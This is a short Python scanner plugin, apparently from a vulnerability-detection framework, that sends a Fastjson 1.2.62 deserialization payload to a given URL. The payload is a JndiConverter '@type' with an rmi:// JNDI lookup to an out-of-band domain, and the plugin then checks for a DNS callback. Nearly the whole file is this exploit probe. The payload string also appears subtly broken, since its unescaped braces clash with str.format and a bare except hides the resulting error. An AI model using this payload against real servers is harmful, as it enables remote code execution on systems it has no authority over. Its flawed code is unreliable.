import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Fastjson 1.2.62 Deserialization RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson", 
            "https://github.com/wyzxxz/fastjson_rce_tool"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["fastjson", "rce", "deserialization", "oast"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/"""
        method = "POST"
        data = """{
   "@type":"org.apache.xbean.propertyeditor.JndiConverter",
   "AsText":"rmi://{oob_domain}/exploit"
}""".format(oob_domain=oob_domain)
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url